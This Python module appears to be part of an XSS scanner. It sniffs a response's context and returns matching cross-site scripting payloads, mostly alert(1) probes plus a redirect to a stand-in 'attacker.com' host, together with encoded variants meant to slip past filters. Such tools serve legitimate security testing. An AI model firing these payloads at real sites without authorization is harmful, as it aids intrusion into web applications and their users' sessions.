import urllib.parse
import base64

def detect_context(response_text):
    """Detects the context of the target application to craft appropriate payloads."""
    if not response_text:
        return "dom"
    
    response_text = response_text.lower()

    if "<script>" in response_text or "javascript:" in response_text:
        return "javascript"
    elif "<img" in response_text or "<svg" in response_text or "<iframe" in response_text:
        return "html"
    elif "http://" in response_text or "https://" in response_text:
        return "url"
    elif "onmouseover=" in response_text or "onclick=" in response_text:
        return "event_handler"
    elif response_text.strip().startswith("{") and response_text.strip().endswith("}"):
        return "json"
    elif "<style>" in response_text or "body{" in response_text:
        return "css"
    elif "<?xml" in response_text:
        return "xml"
    elif "<meta http-equiv=" in response_text:
        return "meta_tag"
    else:
        return "dom"
    
def get_payloads_by_context():
    """Returns a dictionary of payloads categorized by context."""
    return {
        "html": [
            '<img src=x onerror=alert(1)>',
            '<svg/onload=alert(1)>',
            '<div onmouseover=alert(1)>Hover over me</div>',
            '<input onfocus=alert(1)>',
            '<iframe src="javascript:alert(1)"></iframe>',
            '<video oncanplaythrough=alert(1)><source src="x">',
            '<marquee onstart=alert(1)>XSS</marquee>',
            'straw"><img src=a onerror=alert(1)>hat',
        ],
        "javascript": [
            '";alert(1)//',
            "';alert(1)//",
            "<script>alert(1)</script>",
            "document.location='http://attacker.com'",
            "eval('alert(1)')",
            "setTimeout('alert(1)', 1000)",
        ],
        "url": [
            "javascript:alert(1)",
            "data:text/html,<script>alert(1)</script>",
            "http://example.com/?q=<script>alert(1)</script>",
            "http://example.com/?search=" + urllib.parse.quote("alert(1)"),
        ],
        "event_handler": [
            "<div onmouseover=alert(1)>Hover</div>",
            "<button onclick=alert(1)>Click</button>",
            "<p onmouseenter=alert(1)>Test</p>",
            "<span onfocus=alert(1) tabindex='0'>Focus me</span>",
        ],
        "json": [
            '{"user": "<script>alert(1)</script>"}',
            '{"data": "<img src=x onerror=alert(1)>"}',
            '{"payload": "<svg/onload=alert(1)>"}',
        ],
        "css": [
            "body{background:url(javascript:alert(1))}",
            "@import 'javascript:alert(1)';",
        ],
        "xml": [
            "<user><name><![CDATA[<script>alert(1)</script>]]></name></user>",
            "<![CDATA[<svg/onload=alert(1)>]]>",
        ],
        "iframe": [
            '<iframe src="javascript:alert(1)"></iframe>',
            '<iframe src="data:text/html,<script>alert(1)</script>"></iframe>',
        ],
        "meta_tag": [
            '<meta http-equiv="refresh" content="0;url=javascript:alert(1)">',
            '<meta http-equiv="set-cookie" content="document.cookie=alert(1)">',
        ],
        "dom": [
            "document.write('<script>alert(1)</script>')",
            "window.name = 'alert(1)'; window.location.reload();",
            "setTimeout(\"alert(1)\",1000)",
        ],
    }

def encode_payload(payload):
    """URL encodes a payload."""
    return urllib.parse.quote(payload)

def base64_encode_payload(payload):
    """Base64 encodes a payload."""
    return base64.b64encode(payload.encode()).decode()

def html_entity_encode(payload):
    """Encodes payload using HTML entity references."""
    return ''.join(f"&#x{ord(c):x};" for c in payload)

def js_escape_encode(payload):
    """Encodes payload using JavaScript escape sequences."""
    return ''.join(f"\\x{ord(c):02x}" for c in payload)

def generate_encoded_payloads(payloads):
    """Generates encoded versions of the given payloads."""
    MAX_ENCODED = 100
    encoded_payloads = []
    for payload in payloads[:MAX_ENCODED]:
        encoded_payloads.append(encode_payload(payload))
        encoded_payloads.append(base64_encode_payload(payload))
        
        if "<script>" in payload or "alert(" in payload:
            encoded_payloads.append(html_entity_encode(payload))  # HTML Entity Encoding
            encoded_payloads.append(js_escape_encode(payload))
            
    return encoded_payloads

def generate_dynamic_payloads(response_text):
    """Generates multiple XSS payloads based on detected context using payloads from payloads.py."""
    payloads_by_context = get_payloads_by_context()  # Get categorized payloads
    context = detect_context(response_text)  # Detect context

    # Select payloads based on the detected context
    if context in payloads_by_context:
        selected_payloads = payloads_by_context[context]
        simple_payloads = selected_payloads[:5]
        # Generate encoded versions of the selected payloads
        encoded_payloads = generate_encoded_payloads(simple_payloads)
        return simple_payloads + encoded_payloads  # Return both original and encoded payloads

    return []  # Return an empty list if no context matches